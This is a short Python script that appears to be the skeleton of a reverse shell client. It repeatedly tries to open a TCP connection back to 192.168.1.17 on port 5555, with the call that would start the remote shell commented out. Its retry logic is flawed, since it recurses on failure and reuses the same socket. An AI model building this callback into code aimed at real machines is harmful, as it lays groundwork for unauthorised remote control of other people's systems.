import socket
import time

def connection():
    # Define the number of seconds to wait
    time.sleep(5)
    print('[*] Trying to connect...')
    #  Infinite loop so the program tries to connect every N seconds
    while True:
        try:
            # tries to connect to the server
            sock.connect(('192.168.1.17', 5555))
            print("[+] Connected")
            #     shell()
            sock.close()
            # it breaks the loop if I can connect since no error has been thrown
            break
        except:
            # if it throws an error then
            connection()


sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

connection()
